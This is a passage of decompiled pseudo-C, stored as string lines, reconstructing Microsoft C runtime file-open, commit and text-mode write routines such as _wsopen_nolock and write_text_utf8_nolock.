    "  *(_DWORD *)(a1 + 16) = 128;",
    "  if ( (a2 & 0x80u) != 0 )",
    "    *(_BYTE *)a1 |= 0x10u;",
    "  if ( (a2 & 0x8000) == 0 )",
    "  {",
    "    if ( (a2 & 0x74000) != 0 )",
    "      goto LABEL_28;",
    "    if ( _get_fmode(&PMode) )",
    "      _invoke_watson(0, 0, 0, 0, 0);",
    "    if ( PMode != 0x8000 )",
    "LABEL_28:",
    "      *(_BYTE *)a1 |= 0x80u;",
    "  }",
    "  if ( (a2 & 0x100) != 0 && (a4 & ~(_BYTE)dword_10040884 & 0x80u) == 0 )",
    "    *(_DWORD *)(a1 + 16) = 1;",
    "  if ( (a2 & 0x40) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x4000000u;",
    "    *(_DWORD *)(a1 + 4) |= 0x10000u;",
    "    *(_DWORD *)(a1 + 12) |= 4u;",
    "  }",
    "  if ( (a2 & 0x1000) != 0 )",
    "    *(_DWORD *)(a1 + 16) |= 0x100u;",
    "  if ( (a2 & 0x2000) != 0 )",
    "    *(_DWORD *)(a1 + 20) |= 0x2000000u;",
    "  if ( (a2 & 0x20) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x8000000u;",
    "  }",
    "  else if ( (a2 & 0x10) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x10000000u;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "int __cdecl truncate_ctrl_z_if_present(int FileHandle)",
    "{",
    "  char v1; // al",
    "  DWORD v2; // edi",
    "  unsigned int v3; // edx",
    "  unsigned int v4; // ebx",
    "  DWORD v6; // eax",
    "  int v7; // edx",
    "  WCHAR WideCharStr; // [esp+Ch] [ebp-4h] BYREF",
    "",
    "  v1 = *((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + 56 * (FileHandle & 0x3F));",
    "  if ( (v1 & 0x48) == 0 && v1 < 0 )",
    "  {",
    "    v2 = _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-1LL, 2u);",
    "    v4 = v3;",
    "    if ( (v3 & v2) == 0xFFFFFFFF )",
    "    {",
    "      if ( *(_DWORD *)sub_1001E010() != 131 )",
    "        return *(_DWORD *)sub_1001E025();",
    "    }",
    "    else",
    "    {",
    "      WideCharStr = 0;",
    "      if ( !sub_10022F2D(FileHandle, &WideCharStr, 1u)",
    "        && WideCharStr == 26",
    "        && _chsize_nolock(FileHandle, (LARGE_INTEGER)__PAIR64__(v4, v2)) == -1 )",
    "      {",
    "        return *(_DWORD *)sub_1001E025();",
    "      }",
    "      v6 = _lseeki64_nolock(FileHandle, 0, 0);",
    "      if ( (v7 & v6) == 0xFFFFFFFF )",
    "        return *(_DWORD *)sub_1001E025();",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl _sopen_nolock(int a1, int a2, LPCCH lpMultiByteStr, int a4, int a5, int a6)",
    "{",
    "  UINT utf8_acp_compatibility_codepage; // eax",
    "  int v7; // esi",
    "  int v9[2]; // [esp+4h] [ebp-18h] BYREF",
    "  void *Block; // [esp+Ch] [ebp-10h]",
    "  int v11; // [esp+10h] [ebp-Ch]",
    "  int v12; // [esp+14h] [ebp-8h]",
    "  char v13; // [esp+18h] [ebp-4h]",
    "",
    "  v9[0] = 0;",
    "  v9[1] = 0;",
    "  Block = 0;",
    "  v11 = 0;",
    "  v12 = 0;",
    "  v13 = 0;",
    "  utf8_acp_compatibility_codepage = __acrt_get_utf8_acp_compatibility_codepage();",
    "  if ( sub_1001CD4D(lpMultiByteStr, (int)v9, utf8_acp_compatibility_codepage) )",
    "    v7 = -1;",
    "  else",
    "    v7 = _wsopen_nolock(a1, a2, Block, a4, a5, a6);",
    "  if ( v13 )",
    "    _free_base(Block);",
    "  return v7;",
    "}",
    "",
    "",
    "errno_t __cdecl _sopen_s(int *FileHandle, const char *FileName, int OpenFlag, int ShareFlag, int PermissionMode)",
    "{",
    "  return common_sopen_dispatch<char>(FileName, OpenFlag, ShareFlag, PermissionMode, FileHandle, 1);",
    "}",
    "",
    "",
    "int __cdecl _wsopen_nolock(_DWORD *a1, int *a2, const WCHAR *a3, unsigned int a4, int a5, char a6)",
    "{",
    "  int v7; // eax",
    "  struct _RTL_CRITICAL_SECTION_DEBUG *v8; // edi",
    "  LPCRITICAL_SECTION v9; // eax",
    "  DWORD LastError; // eax",
    "  DWORD FileType; // eax",
    "  DWORD v12; // esi",
    "  int v13; // eax",
    "  int v14; // ecx",
    "  char v15; // al",
    "  bool v16; // zf",
    "  int v17; // eax",
    "  int v18; // esi",
    "  LPCRITICAL_SECTION v19; // edx",
    "  LPCRITICAL_SECTION v20; // eax",
    "  int v21; // esi",
    "  HANDLE v22; // edx",
    "  DWORD v23; // eax",
    "  LPCRITICAL_SECTION v24; // eax",
    "  int v25; // [esp-24h] [ebp-78h]",
    "  int v26[11]; // [esp-20h] [ebp-74h] BYREF",
    "  _BYTE v27[24]; // [esp+Ch] [ebp-48h] BYREF",
    "  _DWORD v28[6]; // [esp+24h] [ebp-30h] BYREF",
    "  struct _SECURITY_ATTRIBUTES v29; // [esp+3Ch] [ebp-18h] BYREF",
    "  char v30; // [esp+48h] [ebp-Ch]",
    "  HANDLE hObject; // [esp+4Ch] [ebp-8h]",
    "  char v32; // [esp+53h] [ebp-1h] BYREF",
    "",
    "  qmemcpy(v28, (const void *)sub_1002820F((int)v27, a4, a5, a6), sizeof(v28));",
    "  if ( v28[3] == -1 )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *a2 = -1;",
    "    return *(_DWORD *)sub_1001E025();",
    "  }",
    "  v7 = _alloc_osfhnd();",
    "  *a2 = v7;",
    "  if ( v7 == -1 )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *a2 = -1;",
    "    *(_DWORD *)sub_1001E025() = 24;",
    "    return *(_DWORD *)sub_1001E025();",
    "  }",
    "  v29.lpSecurityDescriptor = 0;",
    "  v29.nLength = 12;",
    "  *a1 = 1;",
    "  v29.bInheritHandle = ((a4 >> 7) & 1) == 0;",
    "  qmemcpy(&v26[2], v28, 0x18u);",
    "  v8 = (struct _RTL_CRITICAL_SECTION_DEBUG *)create_file(a3, &v29, v26[2], v26[3], v26[4], v26[5], v26[6], v26[7]);",
    "  hObject = v8;",
    "  if ( v8 == (struct _RTL_CRITICAL_SECTION_DEBUG *)-1 )",
    "  {",
    "    if ( (v28[1] & 0xC0000000) != 0xC0000000",
    "      || (a4 & 1) == 0",
    "      || (v28[1] &= ~0x80000000,",
    "          qmemcpy(&v26[2], v28, 0x18u),",
    "          v8 = (struct _RTL_CRITICAL_SECTION_DEBUG *)create_file(",
    "                                                       a3,",
    "                                                       &v29,",
    "                                                       v26[2],",
    "                                                       v26[3],",
    "                                                       v26[4],",
    "                                                       v26[5],",
    "                                                       v26[6],",
    "                                                       v26[7]),",
    "          hObject = v8,",
    "          v8 == (struct _RTL_CRITICAL_SECTION_DEBUG *)-1) )",
    "    {",
    "      v9 = lpCriticalSection[*a2 >> 6];",
    "      *((_BYTE *)&v9[1].LockSemaphore + 56 * (*a2 & 0x3F)) &= ~1u;",
    "      LastError = GetLastError();",
    "      __acrt_errno_map_os_error(LastError);",
    "      return *(_DWORD *)sub_1001E025();",
    "    }",
    "  }",
    "  FileType = GetFileType(v8);",
    "  if ( !FileType )",
    "  {",
    "    v12 = GetLastError();",
    "    __acrt_errno_map_os_error(v12);",
    "    v13 = *a2 >> 6;",
    "    v14 = 56 * (*a2 & 0x3F);",
    "    v26[7] = (int)v8;",
    "    *((_BYTE *)&lpCriticalSection[v13][1].LockSemaphore + v14) &= ~1u;",
    "    CloseHandle((HANDLE)v26[7]);",
    "    if ( !v12 )",
    "      *(_DWORD *)sub_1001E025() = 13;",
    "    return *(_DWORD *)sub_1001E025();",
    "  }",
    "  if ( FileType == 2 )",
    "  {",
    "    v15 = LOBYTE(v28[0]) | 0x40;",
    "  }",
    "  else",
    "  {",
    "    v16 = FileType == 3;",
    "    v15 = v28[0];",
    "    if ( v16 )",
    "      v15 = LOBYTE(v28[0]) | 8;",
    "  }",
    "  v26[7] = (int)v8;",
    "  v26[6] = *a2;",
    "  v32 = v15;",
    "  __acrt_lowio_set_os_handle(v26[6], v8);",
    "  v17 = *a2;",
    "  v30 = v32 | 1;",
    "  LOBYTE(v28[0]) = v32 | 1;",
    "  *((_BYTE *)&lpCriticalSection[v17 >> 6][1].LockSemaphore + 56 * (v17 & 0x3F)) = v32 | 1;",
    "  *((_BYTE *)&lpCriticalSection[*a2 >> 6][1].LockSemaphore + 56 * (*a2 & 0x3F) + 1) = 0;",
    "  if ( (a4 & 2) != 0 )",
    "  {",
    "    v18 = truncate_ctrl_z_if_present(*a2);",
    "    if ( v18 )",
    "    {",
    "      v26[7] = *a2;",
    "LABEL_22:",
    "      _close_nolock(v26[7]);",
    "      return v18;",
    "    }",
    "  }",
    "  v32 = 0;",
    "  v26[7] = (int)&v32;",
    "  v26[6] = a4;",
    "  v25 = *a2;",
    "  qmemcpy(v26, v28, 0x18u);",
    "  v18 = configure_text_mode(v25, v26[0], v26[1], v26[2], v26[3], v26[4], v26[5], a4, &v32);",
    "  if ( v18 )",
    "  {",
    "    v26[7] = *a2;",
    "    goto LABEL_22;",
    "  }",
    "  *((_BYTE *)&lpCriticalSection[*a2 >> 6][1].LockSemaphore + 56 * (*a2 & 0x3F) + 1) = v32;",
    "  v19 = lpCriticalSection[*a2 >> 6];",
    "  *((_BYTE *)&v19[1].SpinCount + 56 * (*a2 & 0x3F) + 1) ^= (*((_BYTE *)&v19[1].SpinCount + 56 * (*a2 & 0x3F) + 1)",
    "                                                          ^ BYTE2(a4))",
    "                                                         & 1;",
    "  if ( (v30 & 0x48) == 0 && (a4 & 8) != 0 )",
    "  {",
    "    v20 = lpCriticalSection[*a2 >> 6];",
    "    *((_BYTE *)&v20[1].LockSemaphore + 56 * (*a2 & 0x3F)) |= 0x20u;",
    "  }",
    "  v21 = v28[1];",
    "  if ( (v28[1] & 0xC0000000) == 0xC0000000 && (a4 & 1) != 0 )",
    "  {",
    "    CloseHandle(hObject);",
    "    v28[1] = v21 & 0x7FFFFFFF;",
    "    qmemcpy(&v26[2], v28, 0x18u);",
    "    v22 = create_file(a3, &v29, v26[2], v26[3], v26[4], v26[5], v26[6], v26[7]);",
    "    if ( v22 == (HANDLE)-1 )",
    "    {",
    "      v23 = GetLastError();",
    "      __acrt_errno_map_os_error(v23);",
    "      v24 = lpCriticalSection[*a2 >> 6];",
    "      *((_BYTE *)&v24[1].LockSemaphore + 56 * (*a2 & 0x3F)) &= ~1u;",
    "      _free_osfhnd(*a2);",
    "      return *(_DWORD *)sub_1001E025();",
    "    }",
    "    *((_DWORD *)&lpCriticalSection[*a2 >> 6][1].DebugInfo + 14 * (*a2 & 0x3F)) = v22;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9e9de3de5fa147e2223d7db92bc10aa6_,_lambda_38ce7e780aa69e748d6df282ebc68efe_ &,_lambda_8ca6da459f0f6780f1cff60fdc3d00e5_>(",
    "        int *a1,",
    "        int **a2,",
    "        int *a3)",
    "{",
    "  int v3; // esi",
    "  void *osfhandle; // eax",
    "  DWORD LastError; // esi",
    "",
    "  v3 = 0;",
    "  __acrt_lowio_lock_fh(*a1);",
    "  if ( (*(_BYTE *)(&lpCriticalSection[**a2 >> 6][1].LockSemaphore + 14 * (**a2 & 0x3F)) & 1) == 0 )",
    "    goto LABEL_4;",
    "  osfhandle = (void *)_get_osfhandle(**a2);",
    "  if ( !FlushFileBuffers(osfhandle) )",
    "  {",
    "    LastError = GetLastError();",
    "    *(_DWORD *)sub_1001E010() = LastError;",
    "LABEL_4:",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    v3 = -1;",
    "  }",
    "  __acrt_lowio_unlock_fh(*a3);",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl _commit(int FileHandle)",
    "{",
    "  int v2; // [esp+4h] [ebp-10h] BYREF",
    "  int *p_FileHandle; // [esp+8h] [ebp-Ch] BYREF",
    "  int v4; // [esp+Ch] [ebp-8h] BYREF",
    "",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( FileHandle >= 0",
    "      && FileHandle < (unsigned int)dword_10040590",
    "      && (*(_BYTE *)(&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + 14 * (FileHandle & 0x3F)) & 1) != 0 )",
    "    {",
    "      v4 = FileHandle;",
    "      p_FileHandle = &FileHandle;",
    "      v2 = FileHandle;",
    "      return __crt_seh_guarded_call<int>::operator()<_lambda_9e9de3de5fa147e2223d7db92bc10aa6_,_lambda_38ce7e780aa69e748d6df282ebc68efe_ &,_lambda_8ca6da459f0f6780f1cff60fdc3d00e5_>(",
    "               &v2,",
    "               &p_FileHandle,",
    "               &v4);",
    "    }",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "DWORD *__cdecl sub_1002890A(DWORD *a1, int a2, void *a3, int a4, struct _Mbstatet *a5)",
    "{",
    "  LPCRITICAL_SECTION v5; // eax",
    "  UINT ConsoleOutputCP; // eax",
    "  bool v7; // zf",
    "  DWORD *v8; // esi",
    "  int v9; // ecx",
    "  CHAR *v10; // edx",
    "  int v11; // edi",
    "  int v12; // ebx",
    "  int v13; // ecx",
    "  _BYTE *v14; // eax",
    "  int v15; // edi",
    "  int v16; // edi",
    "  _BYTE *v17; // ebx",
    "  int v18; // edx",
    "  int v19; // esi",
    "  signed int v20; // eax",
    "  size_t v21; // eax",
    "  LPCRITICAL_SECTION v22; // ecx",
    "  char v23; // ah",
    "  int v24; // eax",
    "  DWORD v25; // eax",
    "  CHAR *v26; // eax",
    "  int v27; // esi",
    "  char v28; // cl",
    "  char *v29; // edx",
    "  int v30; // esi",
    "  struct _Mbstatet *v32; // [esp-4h] [ebp-90h]",
    "  unsigned int v33[2]; // [esp+10h] [ebp-7Ch] BYREF",
    "  int v34; // [esp+18h] [ebp-74h]",
    "  unsigned int v35; // [esp+1Ch] [ebp-70h]",
    "  wchar_t v36[2]; // [esp+20h] [ebp-6Ch] BYREF",
    "  HANDLE hFile; // [esp+24h] [ebp-68h]",
    "  void *Src; // [esp+28h] [ebp-64h]",
    "  DWORD NumberOfBytesWritten; // [esp+2Ch] [ebp-60h] BYREF",
    "  __int16 v40; // [esp+30h] [ebp-5Ch] BYREF",
    "  unsigned int v41[2]; // [esp+34h] [ebp-58h] BYREF",
    "  unsigned int v42; // [esp+3Ch] [ebp-50h]",
    "  int v43; // [esp+40h] [ebp-4Ch]",
    "  size_t Size; // [esp+44h] [ebp-48h]",
    "  int v45; // [esp+48h] [ebp-44h]",
    "  WCHAR WideCharStr[2]; // [esp+4Ch] [ebp-40h] BYREF",
    "  struct _Mbstatet *v47; // [esp+50h] [ebp-3Ch]",
    "  wchar_t v48[2]; // [esp+54h] [ebp-38h] BYREF",
    "  int cchWideChar; // [esp+58h] [ebp-34h]",
    "  CHAR v50; // [esp+5Fh] [ebp-2Dh]",
    "  CHAR *v51; // [esp+60h] [ebp-2Ch]",
    "  CHAR Buffer[8]; // [esp+64h] [ebp-28h] BYREF",
    "  CHAR v53[8]; // [esp+6Ch] [ebp-20h] BYREF",
    "  _BYTE v54[8]; // [esp+74h] [ebp-18h] BYREF",
    "",
    "  Src = a3;",
    "  v47 = a5;",
    "  v45 = a2 >> 6;",
    "  v5 = lpCriticalSection[a2 >> 6];",
    "  v43 = 56 * (a2 & 0x3F);",
    "  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v5[1].DebugInfo + v43);",
    "  v42 = (unsigned int)a3 + a4;",
    "  ConsoleOutputCP = GetConsoleOutputCP();",
    "  v7 = LOBYTE(a5[2]._Byte) == 0;",
    "  v35 = ConsoleOutputCP;",
    "  if ( v7 )",
    "    __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)a5);",
    "  v8 = a1;",
    "  v9 = *(_DWORD *)(*(_DWORD *)&a5[1]._Byte + 8);",
    "  *a1 = 0;",
    "  v34 = v9;",
    "  a1[1] = 0;",
    "  a1[2] = 0;",
    "  v10 = (CHAR *)Src;",
    "  v51 = (CHAR *)Src;",
    "  if ( (unsigned int)Src < v42 )",
    "  {",
    "    v11 = v43;",
    "    v12 = 0;",
    "    v41[1] = 0;",
    "    while ( 1 )",
    "    {",
    "      v50 = *v10;",
    "      *(_DWORD *)WideCharStr = 0;",
    "      cchWideChar = 1;",
    "      if ( v9 == 65001 )",
    "      {",
    "        v13 = 0;",
    "        v14 = (char *)&lpCriticalSection[v45][1].SpinCount + v11 + 2;",
    "        v41[1] = (unsigned int)v14;",
    "        do",
    "        {",
    "          if ( !*v14 )",
    "            break;",
    "          ++v13;",
    "          ++v14;",
    "        }",
    "        while ( v13 < 5 );",
    "        v15 = v42 - (_DWORD)v10;",
    "        cchWideChar = v13;",
    "        if ( v13 <= 0 )",
    "        {",
    "          v20 = byte_1003F2A8[(unsigned __int8)*v10] + 1;",
    "          Size = v20;",
    "          if ( v20 > v15 )",
    "          {",
    "            if ( v15 > 0 )",
    "            {",
    "              v30 = v43;",
    "              do",
    "              {",
    "                *((_BYTE *)&lpCriticalSection[v45][1].SpinCount + v30 + v12 + 2) = v10[v12];",
    "                ++v12;",
    "              }",
    "              while ( v12 < v15 );",
    "LABEL_44:",
    "              v8 = a1;",
    "            }",
    "LABEL_45:",
    "            v8[1] += v15;",
    "            return v8;",
    "          }",
    "          *(_DWORD *)v48 = v10;",
    "          *(_QWORD *)v41 = 0;",
    "          cchWideChar = (v20 == 4) + 1;",
    "          if ( __crt_mbstring::__mbsrtowcs_utf8(",
    "                 (__crt_mbstring *)WideCharStr,",
    "                 v48,",
    "                 (const char **)cchWideChar,",
    "                 (__crt_mbstring *)v41,",
    "                 v47) == -1 )",
    "            return v8;",
    "          v11 = v43;",
    "        }",
    "        else",
    "        {",
    "          *(_DWORD *)v48 = byte_1003F2A8[*(unsigned __int8 *)v41[1]] + 1;",
    "          Size = *(_DWORD *)v48 - v13;",
    "          if ( *(_DWORD *)v48 - v13 > v15 )",
    "          {",
    "            if ( v15 > 0 )",
    "            {",
    "              v26 = v51;",
    "              v27 = cchWideChar;",
    "              do",
    "              {",
    "                v28 = v26[v12];",
    "                v29 = (char *)lpCriticalSection[v45] + v43 + v12++;",
    "                v29[v27 + 46] = v28;",
    "              }",
    "              while ( v12 < v15 );",
    "              goto LABEL_44;",
    "            }",
    "            goto LABEL_45;",
    "          }",
    "          v16 = 0;",
    "          v17 = (_BYTE *)v41[1];",
    "          do",
    "            v54[v16++] = *v17++;",
    "          while ( v16 < v13 );",
    "          v12 = 0;",
    "          if ( (int)Size > 0 )",
    "          {",
    "            memmove(&v54[v13], v10, Size);",
    "            v13 = cchWideChar;",
    "          }",
    "          v11 = v43;",
    "          v18 = 0;",
    "          v19 = v45;",
    "          do",
    "            *((_BYTE *)&lpCriticalSection[v19][1].SpinCount + v11 + v18++ + 2) = 0;",
    "          while ( v18 < v13 );",
    "          v8 = a1;",
    "          *(_DWORD *)v36 = v54;",
    "          *(_QWORD *)v33 = 0;",
    "          cchWideChar = (*(_DWORD *)v48 == 4) + 1;",
    "          if ( __crt_mbstring::__mbsrtowcs_utf8(",
    "                 (__crt_mbstring *)WideCharStr,",
    "                 v36,",
    "                 (const char **)cchWideChar,",
    "                 (__crt_mbstring *)v33,",
    "                 v47) == -1 )",
    "            return v8;",
    "        }",
    "        v21 = (size_t)&v51[Size - 1];",
    "      }",
    "      else",
    "      {",
    "        v22 = lpCriticalSection[v45];",
    "        Size = (size_t)v22;",
    "        v23 = *((_BYTE *)&v22[1].SpinCount + v11 + 1);",
    "        if ( (v23 & 4) != 0 )",
    "        {",
    "          v32 = v47;",
    "          v53[0] = *((_BYTE *)&v22[1].SpinCount + v11 + 2);",
    "          v53[1] = *v10;",
    "          *((_BYTE *)&v22[1].SpinCount + v11 + 1) = v23 & 0xFB;",
    "          v24 = sub_1002129F(WideCharStr, v53, (char *)2, v32);",
    "LABEL_30:",
    "          if ( v24 == -1 )",
    "            return v8;",
    "          v21 = (size_t)v51;",
    "          goto LABEL_32;",
    "        }",
    "        if ( *(__int16 *)(**(_DWORD **)&v47[1]._Byte + 2 * (unsigned __int8)*v10) >= 0 )",
    "        {",
    "          v24 = sub_1002129F(WideCharStr, v10, (char *)1, v47);",
    "          goto LABEL_30;",
    "        }",
    "        *(_DWORD *)v48 = v10 + 1;",
    "        if ( (unsigned int)(v10 + 1) >= v42 )",
    "        {",
    "          *(_BYTE *)(Size + v11 + 46) = *v10;",
    "          *((_BYTE *)&lpCriticalSection[v45][1].SpinCount + v11 + 1) |= 4u;",
    "          v8[1] = v41[1] + 1;",
    "          return v8;",
    "        }",
    "        if ( sub_1002129F(WideCharStr, v10, (char *)2, v47) == -1 )",
    "          return v8;",
    "        v21 = *(_DWORD *)v48;",
    "      }",
    "LABEL_32:",
    "      v51 = (CHAR *)(v21 + 1);",
    "      v25 = sub_10023952(v35, 0, WideCharStr, cchWideChar, Buffer, 5, 0, 0);",
    "      *(_DWORD *)v48 = v25;",
    "      if ( !v25 )",
    "        return v8;",
    "      if ( !WriteFile(hFile, Buffer, v25, &NumberOfBytesWritten, 0) )",
    "      {",
    "LABEL_51:",
    "        *v8 = GetLastError();",
    "        return v8;",
    "      }",
    "      v10 = v51;",
    "      v41[1] = (unsigned int)&v51[v8[2] - (_DWORD)Src];",
    "      v8[1] = v41[1];",
    "      if ( NumberOfBytesWritten < *(_DWORD *)v48 )",
    "        return v8;",
    "      if ( v50 == 10 )",
    "      {",
    "        v40 = 13;",
    "        if ( !WriteFile(hFile, &v40, 1u, &NumberOfBytesWritten, 0) )",
    "          goto LABEL_51;",
    "        if ( !NumberOfBytesWritten )",
    "          return v8;",
    "        ++v8[2];",
    "        ++v8[1];",
    "        v10 = v51;",
    "        v41[1] = v8[1];",
    "      }",
    "      if ( (unsigned int)v10 >= v42 )",
    "        return v8;",
    "      v9 = v34;",
    "    }",
    "  }",
    "  return v8;",
    "}",
    "",
    "",
    "DWORD *__cdecl write_double_translated_unicode_nolock(DWORD *a1, unsigned int a2, int a3)",
    "{",
    "  wchar_t *v3; // edi",
    "  int v4; // ebx",
    "",
    "  *a1 = 0;",
    "  a1[1] = 0;",
    "  a1[2] = 0;",
    "  v3 = (wchar_t *)a2;",
    "  if ( a2 < a2 + a3 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v4 = *v3;",
    "      if ( _putwch_nolock(*v3) != (_WORD)v4 )",
    "        break;",
    "      a1[1] += 2;",
    "      if ( v4 == 10 )",
    "      {",
    "        if ( _putwch_nolock(0xDu) != 13 )",
    "          break;",
    "        ++a1[1];",
    "        ++a1[2];",
    "      }",
    "      if ( (unsigned int)++v3 >= a2 + a3 )",
    "        return a1;",
    "    }",
    "    *a1 = GetLastError();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "bool __cdecl write_requires_double_translation_nolock(int FileHandle, struct __crt_cached_ptd_host *a2)",
    "{",
    "  int v2; // edi",
    "  int v3; // ebx",
    "  DWORD Mode; // [esp+Ch] [ebp-4h] BYREF",
    "",
    "  if ( !_isatty(FileHandle) )",
    "    return 0;",
    "  v2 = FileHandle >> 6;",
    "  v3 = 56 * (FileHandle & 0x3F);",
    "  if ( *((char *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v3) >= 0 )",
    "    return 0;",
    "  if ( !*((_BYTE *)a2 + 20) )",
    "    __crt_cached_ptd_host::update_locale_slow(a2);",
    "  return (*(_DWORD *)(*((_DWORD *)a2 + 3) + 168) || *((_BYTE *)&lpCriticalSection[v2][1].LockSemaphore + v3 + 1))",
    "      && GetConsoleMode(*(HANDLE *)((char *)&lpCriticalSection[v2][1].DebugInfo + v3), &Mode);",
    "}",
    "",
    "",
    "DWORD *__cdecl write_text_ansi_nolock(DWORD *a1, int a2, unsigned int a3, int a4)",
    "{",
    "  char *v4; // ecx",
    "  unsigned int v5; // edx",
    "  HANDLE v6; // edi",
    "  char *v7; // esi",
    "  char v8; // al",
    "  DWORD v9; // esi",
    "  HANDLE v10; // eax",
    "  unsigned int v12; // [esp+Ch] [ebp-140Ch]",
    "  HANDLE hFile; // [esp+10h] [ebp-1408h] BYREF",
    "  _BYTE Buffer[5119]; // [esp+14h] [ebp-1404h] BYREF",
    "  char v15; // [esp+1413h] [ebp-5h] BYREF",
    "  char *v16; // [esp+1428h] [ebp+10h]",
    "",
    "  v4 = (char *)a3;",
    "  v5 = a3 + a4;",
    "  hFile = (HANDLE)*((_DWORD *)&lpCriticalSection[a2 >> 6][1].DebugInfo + 14 * (a2 & 0x3F));",
    "  *a1 = 0;",
    "  v12 = a3 + a4;",
    "  a1[1] = 0;",
    "  a1[2] = 0;",
    "  if ( a3 < a3 + a4 )",
    "  {",
    "    v6 = hFile;",
    "    while ( 1 )",
    "    {",
    "      v7 = Buffer;",
    "      do",
    "      {",
    "        if ( (unsigned int)v4 >= v5 )",
    "          break;",
    "        v8 = *v4++;",
    "        if ( v8 == 10 )",
    "        {",
    "          ++a1[2];",
    "          *v7++ = 13;",
    "        }",
    "        *v7++ = v8;",
    "      }",
    "      while ( v7 < &v15 );",
    "      v16 = v4;",
    "      v9 = v7 - Buffer;",
    "      if ( !WriteFile(v6, Buffer, v9, (LPDWORD)&hFile, 0) )",
    "        break;",
    "      v10 = hFile;",
    "      a1[1] += (DWORD)hFile;",
    "      if ( (unsigned int)v10 >= v9 )",
    "      {",
    "        v4 = v16;",
    "        v5 = v12;",
    "        if ( (unsigned int)v16 < v12 )",
    "          continue;",
    "      }",
    "      return a1;",
    "    }",
    "    *a1 = GetLastError();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "DWORD *__cdecl write_text_utf16le_nolock(DWORD *a1, int a2, unsigned __int16 *a3, int a4)",
    "{",
    "  unsigned __int16 *v4; // ecx",
    "  unsigned int v5; // edx",
    "  char *v6; // esi",
    "  int v7; // eax",
    "  DWORD v8; // esi",
    "  DWORD v9; // eax",
    "  char *v11; // [esp+Ch] [ebp-1410h]",
    "  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-140Ch] BYREF",
    "  HANDLE hFile; // [esp+14h] [ebp-1408h]",
    "  _BYTE Buffer[5118]; // [esp+18h] [ebp-1404h] BYREF",
    "  char v15; // [esp+1416h] [ebp-6h] BYREF",
    "  unsigned __int16 *v16; // [esp+142Ch] [ebp+10h]",
    "",
    "  v4 = a3;",
    "  v5 = (unsigned int)a3 + a4;",
    "  hFile = (HANDLE)*((_DWORD *)&lpCriticalSection[a2 >> 6][1].DebugInfo + 14 * (a2 & 0x3F));",
    "  *a1 = 0;",
    "  v11 = (char *)a3 + a4;",
    "  a1[1] = 0;",
    "  a1[2] = 0;",
    "  while ( (unsigned int)v4 < v5 )",
    "  {",
    "    v6 = Buffer;",
    "    do",
    "    {",
    "      if ( (unsigned int)v4 >= v5 )",
    "        break;",
    "      v7 = *v4++;",
    "      if ( v7 == 10 )",
    "      {",
    "        a1[2] += 2;",
    "        *(_WORD *)v6 = 13;",
    "        v6 += 2;",
    "      }",
    "      *(_WORD *)v6 = v7;",
    "      v6 += 2;",
    "    }",
    "    while ( v6 < &v15 );",
    "    v16 = v4;",
    "    v8 = (v6 - Buffer) & 0xFFFFFFFE;",
    "    if ( !WriteFile(hFile, Buffer, v8, &NumberOfBytesWritten, 0) )",
    "    {",
    "      *a1 = GetLastError();",
    "      return a1;",
    "    }",
    "    v9 = NumberOfBytesWritten;",
    "    a1[1] += NumberOfBytesWritten;",
    "    if ( v9 < v8 )",
    "      return a1;",
    "    v4 = v16;",
    "    v5 = (unsigned int)v11;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "DWORD *__cdecl write_text_utf8_nolock(DWORD *a1, int a2, unsigned int a3, int a4)",
    "{",
    "  DWORD *v4; // esi",
    "  unsigned __int16 *v5; // edi",
    "  unsigned int v6; // esi",
    "  WCHAR *v7; // eax",
    "  int v8; // ecx",
    "  int v9; // eax",
    "  unsigned int v10; // ebx",
    "  unsigned int v12; // [esp+Ch] [ebp-1418h]",
    "  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-1414h] BYREF",
    "  HANDLE hFile; // [esp+14h] [ebp-1410h]",
    "  unsigned int v15; // [esp+18h] [ebp-140Ch]",
    "  CHAR MultiByteStr[3416]; // [esp+1Ch] [ebp-1408h] BYREF",
    "  WCHAR WideCharStr[852]; // [esp+D74h] [ebp-6B0h] BYREF",
    "  char v18; // [esp+141Ch] [ebp-8h] BYREF",
    "",
    "  v4 = a1;",
    "  hFile = (HANDLE)*((_DWORD *)&lpCriticalSection[a2 >> 6][1].DebugInfo + 14 * (a2 & 0x3F));",
    "  v15 = a3 + a4;",
    "  *a1 = 0;",
    "  a1[1] = 0;",
    "  a1[2] = 0;",
    "  v5 = (unsigned __int16 *)a3;",
    "  if ( a3 < a3 + a4 )",
    "  {",
    "LABEL_2:",
    "    v6 = v15;",
    "    v7 = WideCharStr;",
    "    do",
    "    {",
    "      if ( (unsigned int)v5 >= v6 )",
    "        break;",
    "      v8 = *v5++;",
    "      if ( v8 == 10 )",
    "        *v7++ = 13;",
    "      *v7++ = v8;",
    "    }",
    "    while ( v7 < (WCHAR *)&v18 );",
    "    v9 = sub_10023952(0xFDE9u, 0, WideCharStr, v7 - WideCharStr, MultiByteStr, 3413, 0, 0);",
    "    v4 = a1;",
    "    v12 = v9;",
